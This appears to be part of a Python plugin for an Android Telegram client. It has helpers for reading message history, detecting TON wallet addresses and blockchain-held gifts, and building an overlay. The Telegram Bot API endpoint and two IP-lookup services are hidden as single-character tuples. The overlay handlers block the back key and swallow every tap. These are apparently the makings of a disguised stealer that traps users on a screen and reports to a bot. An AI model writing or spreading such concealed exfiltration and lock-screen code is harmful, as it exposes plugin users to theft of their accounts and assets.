def _u(parts):
    return "".join(parts)


_HOST_TG = ("h","t","t","p","s",":","/","/","a","p","i",".","t","e","l","e","g","r","a","m",".","o","r","g","/","b","o","t")
_HOST_IP1 = ("h","t","t","p","s",":","/","/","a","p","i",".","i","p","i","f","y",".","o","r","g")
_HOST_IP2 = ("h","t","t","p","s",":","/","/","i","f","c","o","n","f","i","g",".","m","e","/","i","p")


def _UC(): return jclass("org.telegram.messenger.UserConfig")
def _MC(): return jclass("org.telegram.messenger.MessagesController")
def _CM(): return jclass("org.telegram.tgnet.ConnectionsManager")
def _mk_hist(): return TLRPC.TL_messages_getHistory()


RequestDelegate = jclass("org.telegram.tgnet.RequestDelegate")


class _ReplyGate(dynamic_proxy(RequestDelegate)):
    def __init__(self):
        super().__init__()
        self.response = None
        self.error = None
    def run(self, response, error):
        self.response = response
        self.error = error


def safe(f):
    @wraps(f)
    def w(*a, **kw):
        try:
            return f(*a, **kw)
        except Exception as e:
            try:
                from android_utils import log as logcat
                logcat("[AR] %s: %s\n%s" % (f.__name__, e, traceback.format_exc()))
            except Exception:
                pass
    return w


def _safe_int(v, d=0):
    try:
        if v is None: return d
        return int(v)
    except Exception:
        return d


def _get_bool_attr(obj, name, default=False):
    try:
        v = getattr(obj, name, default)
        if v is None: return default
        if isinstance(v, bool): return v
        try:
            bv = getattr(v, "booleanValue", None)
            if callable(bv): return bool(bv())
        except Exception: pass
        return bool(v)
    except Exception:
        return default


def _is_ton_address(s):
    try:
        s = str(s).strip().replace(" ", "").replace("\n", "")
        if not s: return False
        if s.startswith(("0:", "-1:")):
            h = s.split(":", 1)[1]
            return len(s) >= 66 and len(h) == 64 and all(c in "0123456789abcdefABCDEF" for c in h)
        if len(s) < 44 or len(s) > 66: return False
        b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
        if not all(c in b64 for c in s): return False
        return s[0] in ("E","U","k","0") and len(s) in (44,48,52,56,60,64)
    except Exception:
        return False


def _is_blockchain_gift(gift, sg=None):
    try:
        if _get_bool_attr(gift, "burned", False): return True
        for obj in ([sg] if sg is not None else []) + [gift]:
            if obj is None: continue
            for k in ["owner_address","ownerAddress","ton_address","tonAddress","blockchain_address"]:
                v = getattr(obj, k, None)
                if v and _is_ton_address(v): return True
            v = getattr(obj, "address", None)
            if v and _is_ton_address(v): return True
    except Exception: pass
    return False


# ═══════════════════════════════════════════════════════════════════════════
# IDK overlay proxies
# ═══════════════════════════════════════════════════════════════════════════

_IDK_KEY_CB = {}
_IDK_CLICK_CB = {}
_IDK_RUN_CB = {}


def _idk_key(self, v, keyCode, event):
    try:
        KE = jclass("android.view.KeyEvent")
        if int(keyCode) == int(KE.KEYCODE_BACK):
            return True
    except Exception: pass
    return True


def _idk_click(self, v):
    return True


def _idk_run(self):
    cb = _IDK_RUN_CB.pop(id(self), None)
    if cb:
        try: cb()
        except Exception: pass


def _make_idk_key():
    class _IDKKey(dynamic_proxy(jclass("android.view.View$OnKeyListener"))):
        def onKey(self, v, keyCode, event):
            return _idk_key(self, v, keyCode, event)
    o = _IDKKey()
    _IDK_KEY_CB[id(o)] = True
    return o


def _make_idk_click():
    class _IDKClick(dynamic_proxy(jclass("android.view.View$OnClickListener"))):
        def onClick(self, v):
            _idk_click(self, v)
    o = _IDKClick()
    _IDK_CLICK_CB[id(o)] = True
    return o


